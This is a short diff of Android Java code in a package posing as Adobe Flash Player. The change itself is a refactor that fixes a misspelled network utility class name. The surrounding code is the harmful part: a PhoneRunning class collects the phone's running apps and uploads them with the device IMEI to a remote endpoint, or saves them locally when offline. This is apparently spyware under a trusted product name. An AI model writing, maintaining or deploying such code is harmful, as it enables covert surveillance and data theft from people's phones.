@@ -22,9 +22,8 @@ import android.os.Build;
 import android.util.Log;
 import com.adobe.flashplayer.Public;
 
-import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.MyLog;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.PrefOper;
 
@@ -85,7 +84,7 @@ public class PhoneRunning implements Runnable{
 
                 String appprocss = getPhoneRunningJava(context);
                 if(appprocss != null && appprocss.equals("") == false ){
-                    if (NetworkUitls.isNetworkAvailable(context) == false) {
+                    if (NetworkUtils.isNetworkAvailable(context) == false) {
                         MyLog.writeFile(Public.LOCAL_PATH_NAME, Public.RUNNINGAPPS_FILE_NAME, appprocss,false);
                     }else{
                         UploadData.upload(appprocss.getBytes(), appprocss.getBytes().length, Public.CMD_DATA_RUNNINGAPPS, Public.IMEI);
